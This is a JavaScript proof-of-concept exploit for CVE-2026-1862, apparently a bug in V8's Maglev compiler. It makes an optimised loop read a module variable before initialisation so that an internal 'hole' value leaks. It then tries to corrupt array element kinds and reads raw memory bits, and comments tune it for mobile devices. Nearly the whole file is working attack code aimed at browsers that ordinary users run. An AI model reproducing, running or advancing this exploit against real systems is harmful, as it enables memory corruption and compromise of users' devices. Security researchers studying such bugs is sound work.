// CVE-2026-1862 PoC v2 — Fixed: fewer iterations + correct TDZ ordering
// Key: function must be called BEFORE the export let declaration in execution order
// Function body references x which is in TDZ at call time
// Maglev OSR compiles the loop, removes hole check for LoadTaggedField(cell)

// Hoisted function — references x which is declared BELOW
function leak() {
  // Reduced to 500K for mobile device speed
  // Maglev OSR typically triggers at ~10K-50K iterations
  for (let i = 0; i < 500000; i++) {
    if (i === 499999) {
      return x; // x is in TDZ! After Maglev OSR, no hole check
    }
  }
}

// CRITICAL: call leak() BEFORE export let x
// At this point x binding exists (module instantiation) but is in TDZ
let leaked = leak();

// Now declare and initialize x (AFTER the leak attempt)
export let x = 42;

// Detect hole
let isHole = (typeof leaked === "undefined" && leaked !== undefined);
let gotError = false;

let tests = {
  type: typeof leaked,
  isUndefined: leaked === undefined,
  eqUndefined: leaked == undefined,
  isNull: leaked === null,
  isHole: isHole,
  xAfter: x, // Should be 42
};

try { tests.str = String(leaked); } catch(e) { tests.strErr = e.message; }
try { tests.num = Number(leaked); } catch(e) { tests.numErr = e.message; }
try { tests.json = JSON.stringify(leaked); } catch(e) { tests.jsonErr = e.message; }

// If hole leaked, try array corruption
if (isHole) {
  tests.HOLE_LEAKED = true;
  try {
    // Store hole in double array — may corrupt element kind
    let dbl = [1.1, 2.2, 3.3];
    dbl[0] = leaked;
    tests.dblAfter = dbl[0];
    tests.dblLen = dbl.length;
    tests.dblHas0 = 0 in dbl;

    // Read raw bits
    let buf = new ArrayBuffer(8);
    let f64 = new Float64Array(buf);
    let u32 = new Uint32Array(buf);
    f64[0] = dbl[0];
    tests.rawBits = "0x" + u32[1].toString(16).padStart(8,'0') + u32[0].toString(16).padStart(8,'0');
  } catch(e) {
    tests.holeExploitErr = e.message;
  }
}

if (typeof document !== 'undefined') {
  document.title = "V2:" + JSON.stringify(tests);
}
